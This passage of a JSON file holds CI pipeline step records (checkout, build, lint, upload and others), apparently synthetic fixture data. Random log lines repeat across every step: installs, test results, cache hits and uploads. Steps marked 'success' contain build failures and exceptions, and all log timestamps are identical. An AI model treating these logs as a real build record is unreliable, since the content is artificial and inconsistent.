          "  PASS: test_auth_login (470ms)",
          "  PASS: test_cache_hit (399ms)",
          "Compiling src/service.java...",
          "Exception: TypeError",
          "Artifact uploaded: build.tar.gz (22MB)",
          "\u2713 test completed",
          "[12:00:30] INFO: Processing request",
          "Step 4/10: Building",
          "Cache hit for key-6804",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Compiling src/app.ts...",
          "WARNING: react has known vulnerabilities",
          "Installing lodash@5.19.0",
          "Installing webpack@1.0.0",
          "Artifact uploaded: build.tar.gz (21MB)",
          "WARNING: express has known vulnerabilities",
          "\u2713 lint completed",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "Compiling src/app.ts...",
          "WARNING: eslint has known vulnerabilities",
          "Installing prettier@1.5.0",
          "Installing webpack@2.0.0",
          "[12:00:30] WARN: Deprecated API usage",
          "[12:00:30] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Compiling src/service.java...",
          "  PASS: test_user_create (475ms)",
          "FAILED: test_db_connect",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Cache hit for key-1205",
          "Cache hit for key-1187",
          "Cache hit for key-4144",
          "Cache hit for key-8148",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (85ms)",
          "Installing lodash@2.1.0",
          "\u2713 test completed",
          "Installing axios@5.9.0",
          "Artifact uploaded: build.tar.gz (46MB)",
          "\u2713 lint completed",
          "  PASS: test_db_connect (205ms)",
          "  PASS: test_auth_login (291ms)",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Compiling src/index.js...",
          "  PASS: test_api_health (205ms)",
          "Cache hit for key-1008",
          "Artifact uploaded: build.tar.gz (41MB)",
          "\u2713 lint completed",
          "[12:00:30] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_user_create (249ms)",
          "Step 9/10: Building",
          "\u2713 build completed",
          "Step 8/10: Building",
          "Step 1/10: Building",
          "  PASS: test_user_create (32ms)",
          "Installing lodash@1.11.0",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Cache hit for key-1703",
          "[12:00:30] WARN: Deprecated API usage",
          "Cache hit for key-8849",
          "Installing prettier@2.5.0",
          "Step 9/10: Building",
          "  PASS: test_auth_login (13ms)",
          "Step 1/10: Building",
          "  PASS: test_db_connect (462ms)",
          "Step 1/10: Building",
          "  PASS: test_cache_hit (317ms)",
          "[12:00:30] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (375ms)",
          "Compiling src/app.ts...",
          "Installing react@1.20.0",
          "[12:00:30] ERROR: Connection failed",
          "Installing express@5.14.0",
          "Installing lodash@2.13.0",
          "Cache hit for key-2943",
          "\u2713 test completed",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Installing axios@5.18.0",
          "Installing webpack@3.14.0",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Installing lodash@2.6.0",
          "Exception: ValueError",
          "Step 6/10: Building",
          "\u2713 build completed",
          "  PASS: test_api_health (413ms)",
          "\u2717 build failed with exit code 37",
          "  PASS: test_api_health (24ms)",
          "Installing express@5.5.0",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-8024",
          "\u2713 build completed",
          "Exception: RuntimeError",
          "Compiling src/service.java...",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-2863",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "[12:00:30] INFO: Processing request",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (7MB)",
          "[12:00:30] INFO: Processing request",
          "Compiling src/index.js...",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "\u2713 lint completed",
          "Cache hit for key-6270",
          "Step 10/10: Building",
          "Compiling src/main.py...",
          "Installing axios@5.16.0",
          "Cache hit for key-1346",
          "Installing webpack@4.7.0",
          "Step 4/10: Building",
          "  PASS: test_user_create (316ms)",
          "Installing jest@2.15.0",
          "Step 3/10: Building",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Cache hit for key-9312",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (34MB)",
          "  PASS: test_auth_login (95ms)",
          "Compiling src/main.py...",
          "WARNING: lodash has known vulnerabilities",
          "Step 1/10: Building",
          "Step 2/10: Building",
          "Cache hit for key-9138",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_db_connect (373ms)",
          "Compiling src/utils.go...",
          "Cache hit for key-8142",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-28T12:00:48.747063",
        "finished_at": "2025-11-28T12:00:52.380753",
        "log_lines": [
          "=== Step: checkout ===",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Installing axios@1.9.0",
          "  PASS: test_db_connect (290ms)",
          "[12:00:30] ERROR: Connection failed",
          "Compiling src/service.java...",
          "Compiling src/handler.rs...",
          "Compiling src/app.ts...",
          "Cache hit for key-5961",
          "[12:00:30] WARN: Deprecated API usage",
          "Installing jest@1.17.0",
          "WARNING: express has known vulnerabilities",
          "  PASS: test_api_health (402ms)",
          "\u2713 lint completed",
          "Cache hit for key-4092",
          "Step 5/10: Building",
          "  PASS: test_api_health (181ms)",
          "Cache hit for key-1125",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "Installing lodash@2.16.0",
          "Installing axios@1.9.0",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_user_create (469ms)",
          "  PASS: test_cache_hit (22ms)",
          "  PASS: test_user_create (66ms)",
          "Compiling src/service.java...",
          "  PASS: test_user_create (28ms)",
          "FAILED: test_cache_hit",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/index.js...",
          "Compiling src/app.ts...",
          "Installing react@5.8.0",
          "  PASS: test_db_connect (341ms)",
          "\u2717 build failed with exit code 122",
          "  PASS: test_auth_login (444ms)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "Cache hit for key-9471",
          "Compiling src/app.ts...",
          "  PASS: test_user_create (174ms)",
          "Step 10/10: Building",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Cache hit for key-8414",
          "Compiling src/utils.go...",
          "WARNING: express has known vulnerabilities",
          "Installing webpack@1.5.0",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Compiling src/app.ts...",
          "Step 9/10: Building",
          "Step 5/10: Building",
          "Compiling src/service.java...",
          "Cache hit for key-4112",
          "Compiling src/handler.rs...",
          "Cache hit for key-8113",
          "  PASS: test_auth_login (448ms)",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_db_connect (44ms)",
          "[12:00:30] INFO: Processing request",
          "Installing react@3.19.0",
          "Step 9/10: Building",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (15MB)",
          "\u2713 test completed",
          "  PASS: test_user_create (135ms)",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-7804",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:30] INFO: Processing request",
          "Installing react@2.4.0",
          "  PASS: test_cache_hit (71ms)",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Cache hit for key-3657",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "Cache hit for key-5633",
          "  PASS: test_api_health (430ms)",
          "  PASS: test_cache_hit (447ms)",
          "Cache hit for key-3362",
          "Installing react@5.19.0",
          "  PASS: test_db_connect (316ms)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (3MB)",
          "  PASS: test_db_connect (151ms)",
          "  PASS: test_cache_hit (378ms)",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Cache hit for key-8075",
          "Installing express@1.15.0",
          "Step 5/10: Building",
          "  PASS: test_cache_hit (305ms)",
          "  PASS: test_api_health (398ms)",
          "  PASS: test_api_health (75ms)",
          "Cache hit for key-2870",
          "Step 7/10: Building",
          "WARNING: axios has known vulnerabilities",
          "Installing react@5.13.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing react@2.10.0",
          "WARNING: react has known vulnerabilities",
          "\u2713 test completed",
          "Step 5/10: Building",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "Installing react@5.20.0",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Installing jest@4.18.0",
          "Compiling src/handler.rs...",
          "Compiling src/index.js...",
          "  PASS: test_auth_login (381ms)",
          "Step 7/10: Building",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Exception: RuntimeError",
          "Cache hit for key-2992",
          "Step 6/10: Building",
          "Exception: ValueError",
          "[12:00:30] INFO: Processing request",
          "Installing webpack@4.11.0",
          "Cache hit for key-8836",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (1MB)",
          "[12:00:30] INFO: Processing request",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Installing lodash@5.5.0",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Cache hit for key-4943",
          "Artifact uploaded: build.tar.gz (10MB)",
          "  PASS: test_db_connect (427ms)",
          "  PASS: test_api_health (291ms)",
          "  PASS: test_cache_hit (371ms)",
          "Installing webpack@4.4.0",
          "Artifact uploaded: build.tar.gz (21MB)",
          "WARNING: react has known vulnerabilities",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-8419",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_api_health (368ms)",
          "Step 10/10: Building",
          "Cache hit for key-2969",
          "Installing webpack@2.15.0",
          "Installing express@1.19.0",
          "[12:00:30] INFO: Processing request",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Installing lodash@3.1.0",
          "Installing lodash@5.18.0",
          "WARNING: jest has known vulnerabilities",
          "Cache hit for key-8821",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 build completed",
          "Cache hit for key-1586",
          "[12:00:30] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-28T12:00:52.380753",
        "finished_at": "2025-11-28T12:01:19.633428",
        "log_lines": [
          "=== Step: build ===",
          "Installing express@1.17.0",
          "Installing axios@2.10.0",
          "FAILED: test_user_create",
          "Step 6/10: Building",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (44MB)",
          "  PASS: test_auth_login (400ms)",
          "\u2713 lint completed",
          "[12:00:30] ERROR: Connection failed",
          "Compiling src/app.ts...",
          "Compiling src/utils.go...",
          "Exception: NullPointerException",
          "  PASS: test_cache_hit (447ms)",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (4MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:30] ERROR: Connection failed",
          "Cache hit for key-2209",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Compiling src/handler.rs...",
          "Installing eslint@2.16.0",
          "Cache hit for key-5267",
          "Installing prettier@2.11.0",
          "Installing webpack@3.2.0",
          "Step 2/10: Building",
          "  PASS: test_cache_hit (374ms)",
          "Cache hit for key-2321",
          "Step 4/10: Building",
          "Step 10/10: Building",
          "Step 1/10: Building",
          "\u2713 build completed",
          "Step 2/10: Building",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (34MB)",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (206ms)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "  PASS: test_db_connect (262ms)",
          "\u2713 build completed",
          "Installing express@1.6.0",
          "\u2713 build completed",
          "Cache hit for key-6628",
          "Cache hit for key-7763",
          "[12:00:30] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (36MB)",
          "\u2713 test completed",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (44MB)",
          "  PASS: test_auth_login (495ms)",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (41MB)",
          "\u2713 build completed",
          "  PASS: test_auth_login (372ms)",
          "Compiling src/app.ts...",
          "Cache hit for key-8863",
          "  PASS: test_auth_login (492ms)",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Artifact uploaded: build.tar.gz (24MB)",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_db_connect (456ms)",
          "[12:00:30] INFO: Processing request",
          "Step 10/10: Building",
          "  PASS: test_api_health (57ms)",
          "Cache hit for key-3589",
          "  PASS: test_cache_hit (80ms)",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "Exception: NullPointerException",
          "Installing prettier@2.19.0",
          "Cache hit for key-6364",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Cache hit for key-2410",
          "[12:00:30] INFO: Processing request",
          "Compiling src/main.py...",
          "Cache hit for key-1833",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (20MB)",
          "[12:00:30] INFO: Processing request",
          "Step 3/10: Building",
          "Step 3/10: Building",
          "\u2713 build completed",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Cache hit for key-1769",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Cache hit for key-2733",
          "Step 9/10: Building",
          "Compiling src/handler.rs...",
          "Compiling src/index.js...",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_db_connect (494ms)",
          "Cache hit for key-9395",
          "Compiling src/main.py...",
          "Cache hit for key-1673",
          "  PASS: test_user_create (428ms)",
          "Cache hit for key-4514",
          "\u2713 test completed",
          "\u2713 test completed",
          "Installing lodash@5.13.0",
          "  PASS: test_cache_hit (483ms)",
          "Compiling src/main.py...",
          "Cache hit for key-8990",
          "Installing lodash@3.0.0",
          "Compiling src/index.js...",
          "Cache hit for key-9678",
          "\u2713 build completed",
          "Step 3/10: Building",
          "  PASS: test_db_connect (445ms)",
          "Step 9/10: Building",
          "\u2713 test completed",
          "[12:00:30] WARN: Deprecated API usage",
          "[12:00:30] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (489ms)",
          "Step 5/10: Building",
          "  PASS: test_auth_login (396ms)",
          "\u2713 test completed",
          "Step 1/10: Building",
          "  PASS: test_user_create (79ms)",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing express@1.7.0",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_db_connect (128ms)",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Installing prettier@2.6.0",
          "Installing lodash@5.8.0",
          "Compiling src/app.ts...",
          "Installing eslint@5.5.0",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Step 8/10: Building",
          "Installing prettier@3.17.0",
          "  PASS: test_auth_login (72ms)",
          "\u2713 test completed",
          "Cache hit for key-3673",
          "[12:00:30] INFO: Processing request",
          "Exception: NullPointerException",
          "[12:00:30] INFO: Processing request",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Compiling src/service.java...",
          "Step 1/10: Building",
          "[12:00:30] INFO: Processing request",
          "Step 4/10: Building",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Installing webpack@4.19.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (4MB)",
          "\u2713 build completed",
          "Cache hit for key-3189",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Installing jest@4.12.0",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-28T12:01:19.633428",
        "finished_at": "2025-11-28T12:01:46.886103",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "[12:00:30] INFO: Processing request",
          "Installing jest@1.19.0",
          "Cache hit for key-3704",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 test completed",
          "  PASS: test_user_create (264ms)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "\u2713 build completed",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-3245",
          "\u2717 build failed with exit code 60",
          "Installing axios@4.10.0",
          "Installing jest@3.16.0",
          "[12:00:30] INFO: Processing request",
          "\u2713 lint completed",
          "Step 6/10: Building",
          "\u2713 build completed",
          "  PASS: test_db_connect (74ms)",
          "Compiling src/main.py...",
          "[12:00:30] INFO: Processing request",
          "\u2713 build completed",
          "Cache hit for key-8823",
          "Artifact uploaded: build.tar.gz (23MB)",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-3469",
          "Cache hit for key-5061",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "[12:00:30] WARN: Deprecated API usage",
          "Cache hit for key-6460",
          "\u2713 build completed",
          "Installing axios@3.2.0",
          "Installing prettier@3.9.0",
          "Compiling src/handler.rs...",
          "Installing prettier@5.11.0",
          "[12:00:30] INFO: Processing request",
          "Compiling src/utils.go...",
          "Step 9/10: Building",
          "\u2713 lint completed",
          "\u2717 build failed with exit code 12",
          "Compiling src/main.py...",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_auth_login (462ms)",
          "Installing express@4.20.0",
          "\u2713 build completed",
          "Installing eslint@3.10.0",
          "[12:00:30] INFO: Processing request",
          "Compiling src/service.java...",
          "[12:00:30] INFO: Processing request",
          "WARNING: jest has known vulnerabilities",
          "Step 4/10: Building",
          "[12:00:30] WARN: Deprecated API usage",
          "[12:00:30] INFO: Processing request",
          "Step 1/10: Building",
          "Cache hit for key-5695",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 test completed",
          "  PASS: test_cache_hit (440ms)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "\u2713 lint completed",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Cache hit for key-4489",
          "Cache hit for key-8506",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "Cache hit for key-8824",
          "\u2717 build failed with exit code 43",
          "Artifact uploaded: build.tar.gz (47MB)",
          "  PASS: test_cache_hit (325ms)",
          "\u2713 build completed",
          "[12:00:30] INFO: Processing request",
          "\u2713 lint completed",
          "Cache hit for key-1345",
          "Cache hit for key-2531",
          "Artifact uploaded: build.tar.gz (33MB)",
          "\u2713 build completed",
          "Step 3/10: Building",
          "[12:00:30] INFO: Processing request",
          "Installing express@5.16.0",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Step 5/10: Building",
          "Step 7/10: Building",
          "Step 8/10: Building",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "Installing express@1.9.0",
          "Step 4/10: Building",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Cache hit for key-3309",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Compiling src/service.java...",
          "[12:00:30] INFO: Processing request",
          "Step 1/10: Building",
          "Installing eslint@2.20.0",
          "[12:00:30] INFO: Processing request",
          "Step 1/10: Building",
          "  PASS: test_cache_hit (285ms)",
          "Installing lodash@1.13.0",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Cache hit for key-6329",
          "Installing eslint@2.8.0",
          "\u2713 test completed",
          "  PASS: test_auth_login (268ms)",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Installing prettier@5.3.0",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Installing react@5.17.0",
          "Exception: RuntimeError",
          "Step 10/10: Building",
          "  PASS: test_user_create (108ms)",
          "Compiling src/service.java...",
          "Cache hit for key-4666",
          "Cache hit for key-3502",
          "  PASS: test_user_create (388ms)",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "[12:00:30] INFO: Processing request",
          "Step 7/10: Building",
          "Compiling src/index.js...",
          "  PASS: test_user_create (252ms)",
          "Compiling src/app.ts...",
          "  PASS: test_cache_hit (232ms)",
          "[12:00:30] INFO: Processing request",
          "Installing prettier@1.8.0",
          "Step 3/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_auth_login (45ms)",
          "\u2713 build completed",
          "\u2713 lint completed",
          "[12:00:30] INFO: Processing request",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (46MB)",
          "[12:00:30] INFO: Processing request",
          "Step 10/10: Building",
          "Compiling src/main.py...",
          "[12:00:30] INFO: Processing request",
          "Compiling src/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/index.js...",
          "Cache hit for key-6433",
          "Installing react@4.6.0",
          "\u2713 build completed",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-2212",
          "[12:00:30] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Cache hit for key-1314",
          "FAILED: test_cache_hit",
          "WARNING: webpack has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Compiling src/main.py...",
          "Step 3/10: Building",
          "Installing lodash@2.2.0",
          "Installing jest@4.18.0",
          "[12:00:30] INFO: Processing request",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (46MB)",
          "  PASS: test_auth_login (440ms)",
          "Compiling src/service.java...",
          "Compiling src/utils.go...",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-28T12:01:46.886103",
        "finished_at": "2025-11-28T12:01:55.970328",
        "log_lines": [
          "=== Step: lint ===",
          "Step 6/10: Building",
          "[12:00:30] WARN: Deprecated API usage",
          "\u2713 test completed",
          "\u2713 build completed",
          "Step 10/10: Building",
          "Cache hit for key-9457",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Compiling src/index.js...",
          "Step 5/10: Building",
          "Cache hit for key-7522",
          "Cache hit for key-8142",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (24MB)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (8MB)",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (3MB)",
          "\u2713 build completed",
          "Cache hit for key-6405",
          "\u2717 build failed with exit code 64",
          "Compiling src/service.java...",
          "Installing webpack@5.17.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (39MB)",
          "  PASS: test_auth_login (53ms)",
          "  PASS: test_api_health (119ms)",
          "Step 2/10: Building",
          "  PASS: test_api_health (424ms)",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-9435",
          "Compiling src/handler.rs...",
          "Compiling src/index.js...",
          "Step 2/10: Building",
          "\u2713 build completed",
          "\u2717 build failed with exit code 101",
          "  PASS: test_api_health (345ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing axios@5.0.0",
          "  PASS: test_api_health (444ms)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:30] INFO: Processing request",
          "WARNING: jest has known vulnerabilities",
          "Installing webpack@4.9.0",
          "[12:00:30] WARN: Deprecated API usage",
          "Cache hit for key-1698",
          "Step 1/10: Building",
          "Step 4/10: Building",
          "Step 3/10: Building",
          "Cache hit for key-4994",
          "Step 4/10: Building",
          "WARNING: express has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (34MB)",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "  PASS: test_api_health (71ms)",
          "[12:00:30] INFO: Processing request",
          "Compiling src/utils.go...",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Artifact uploaded: build.tar.gz (9MB)",
          "[12:00:30] INFO: Processing request",
          "Installing jest@2.5.0",
          "  PASS: test_user_create (119ms)",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-9884",
          "Installing webpack@2.9.0",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Cache hit for key-5761",
          "Artifact uploaded: build.tar.gz (14MB)",
          "\u2713 build completed",
          "Step 2/10: Building",
          "[12:00:30] WARN: Deprecated API usage",
          "Installing eslint@4.15.0",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "\u2713 build completed",
          "\u2713 test completed",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "\u2717 build failed with exit code 58",
          "Compiling src/index.js...",
          "[12:00:30] INFO: Processing request",
          "Installing lodash@5.4.0",
          "\u2713 build completed",
          "Compiling src/app.ts...",
          "WARNING: eslint has known vulnerabilities",
          "Compiling src/service.java...",
          "Compiling src/index.js...",
          "Cache hit for key-8616",
          "[12:00:30] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Installing react@2.19.0",
          "Compiling src/utils.go...",
          "Step 3/10: Building",
          "[12:00:30] INFO: Processing request",
          "Compiling src/handler.rs...",
          "WARNING: express has known vulnerabilities",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Step 1/10: Building",
          "[12:00:30] INFO: Processing request",
          "Compiling src/index.js...",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_user_create (386ms)",
          "Compiling src/main.py...",
          "Cache hit for key-8034",
          "Exception: RuntimeError",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "[12:00:30] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (252ms)",
          "Step 5/10: Building",
          "Step 2/10: Building",
          "Compiling src/index.js...",
          "Cache hit for key-1719",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_db_connect (185ms)",
          "  PASS: test_api_health (359ms)",
          "Step 4/10: Building",
          "  PASS: test_auth_login (114ms)",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-6839",
          "\u2713 lint completed",
          "Step 5/10: Building",
          "Cache hit for key-8419",
          "Step 4/10: Building",
          "Step 1/10: Building",
          "\u2713 test completed",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Installing express@2.0.0",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (33MB)",
          "[12:00:30] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (332ms)",
          "Artifact uploaded: build.tar.gz (12MB)",
          "  PASS: test_db_connect (209ms)",
          "Compiling src/app.ts...",
          "[12:00:30] INFO: Processing request",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (17MB)",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Installing lodash@4.3.0",
          "Artifact uploaded: build.tar.gz (19MB)",
          "[12:00:30] INFO: Processing request",
          "Installing lodash@2.0.0",
          "  PASS: test_user_create (329ms)",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (22MB)",
          "[12:00:30] INFO: Processing request",
          "Step 6/10: Building",
          "  PASS: test_cache_hit (281ms)",
          "Step 6/10: Building",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "Installing jest@2.19.0",
          "  PASS: test_user_create (298ms)",
          "Step 3/10: Building",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (34MB)",
          "[12:00:30] INFO: Processing request",
          "Compiling src/index.js...",
          "Cache hit for key-2985",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-28T12:01:55.970328",
        "finished_at": "2025-11-28T12:02:05.054553",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/handler.rs...",
          "Compiling src/app.ts...",
          "  PASS: test_user_create (5ms)",
          "Step 4/10: Building",
          "Cache hit for key-6086",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Installing lodash@4.16.0",
          "[12:00:30] WARN: Deprecated API usage",
          "  PASS: test_user_create (398ms)",
          "  PASS: test_cache_hit (42ms)",
          "Compiling src/utils.go...",
          "[12:00:30] WARN: Deprecated API usage",
          "Compiling src/utils.go...",
          "Installing eslint@2.9.0",
          "\u2713 test completed",
          "Installing react@5.12.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/main.py...",
          "[12:00:30] INFO: Processing request",
          "Compiling src/utils.go...",
          "Installing lodash@1.18.0",
          "\u2713 test completed",
          "\u2713 lint completed",
